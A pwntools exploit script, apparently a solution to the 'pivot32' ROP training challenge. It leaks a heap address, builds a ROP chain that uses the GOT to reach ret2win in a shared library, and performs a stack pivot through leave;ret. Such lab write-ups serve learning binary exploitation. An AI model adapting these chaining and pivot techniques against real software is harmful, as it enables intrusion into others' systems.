# -*- coding: utf-8 -*-
from pwn import *
p = process('./pivot32')
elf = ELF("./pivot32")

plt_foothold_function = elf.plt["foothold_function"]
got_foothold_function = elf.got["foothold_function"]
# 0x967 - 0x770 = 503
ret2win_offset = 503

# ROPgadget --binary ./pivot32 --depth 20
# 0x080488c0 : pop eax ; ret
# 0x080488c2 : xchg eax, esp ; ret
# 0x080488c4 : mov eax, dword ptr [eax] ; ret
# 0x080488c7 : add eax, ebx ; ret
# 0x08048571 : pop ebx ; ret
# 0x080486a3 : call eax
# 0x080486a8 : leave ; ret


pop_eax_ret = 0x080488c0
xchg_eax_esp = 0x080488c2
mov_eax_eax = 0x080488c4
add_eax_ebx_ret = 0x080488c7
pop_ebx_ret = 0x08048571
call_rax = 0x080486a3

p.recvuntil("Call ret2win() from libpivot.so\n")
p.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")
heap_addr = int(p.recvuntil("\n").replace("\n", ""), 16)


print "heap_addr: " + hex(heap_addr)

p.recvuntil("> ")
rop_gadget = p32(plt_foothold_function)
rop_gadget += p32(pop_eax_ret) 
rop_gadget += p32(got_foothold_function)
rop_gadget += p32(mov_eax_eax)
rop_gadget += p32(pop_ebx_ret)
rop_gadget += p32(ret2win_offset)
rop_gadget += p32(add_eax_ebx_ret)
rop_gadget += p32(call_rax)

p.sendline(rop_gadget)




# p.recvuntil("> ")
# payload = "a" * 44
# payload += p32(pop_eax_ret)
# payload += p32(heap_addr)
# payload += p32(xchg_eax_esp)
# p.sendline(payload)

leave_ret = 0x080486a8
p.recvuntil("> ")
payload = "a" * 40
payload += p32(heap_addr - 4) # 因为后面的leave会pop ebp，所以这减4
payload += p32(leave_ret)
p.sendline(payload)

p.recvuntil("into libpivot.so")
p.interactive()


